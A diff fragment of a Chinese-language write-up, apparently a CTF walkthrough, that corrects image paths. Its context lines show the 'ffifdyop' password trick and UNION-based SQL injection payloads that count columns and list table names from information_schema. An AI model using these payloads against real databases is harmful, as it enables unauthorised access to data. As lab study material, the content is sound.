@@ -145,12 +145,12 @@ password=ffifdyop
 ```txt
 ' and 0 union select 1,2,3#
 ```
-![行数测试](image\column_test_3.png)
+![行数测试](./image/column_test_3.png)
 接下来查询表名
 ```txt
 ' and 0 union select 1,2,table_name from information_schema.tables#
 ```
-![查询表名](image\column_name.png)
+![查询表名](./image/column_name.png)
 得到了表名称secret_table
 接下来查询列名
 ```txt
